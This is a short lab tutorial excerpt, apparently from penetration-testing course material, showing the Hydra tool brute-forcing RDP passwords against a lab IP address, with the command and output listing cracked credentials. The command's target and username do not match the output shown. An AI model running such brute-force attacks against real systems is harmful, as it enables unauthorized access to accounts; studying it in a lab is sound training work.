#### Hydra - RDP

We can also use `Hydra` to perform RDP bruteforcing.

  Hydra - RDP

```shell-session
Tachipy@htb[/htb]$ hydra -l "Johanna" -P ./password.list rdp:/10.129.163.211 -t 64

[DATA] attacking rdp://10.129.42.197:3389/
[3389][rdp] account on 10.129.42.197 might be valid but account not active for remote desktop: login: mrb3n password: rockstar, continuing attacking the account.
[3389][rdp] account on 10.129.42.197 might be valid but account not active for remote desktop: login: cry0l1t3 password: delta, continuing attacking the account.
[3389][rdp] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid password found
```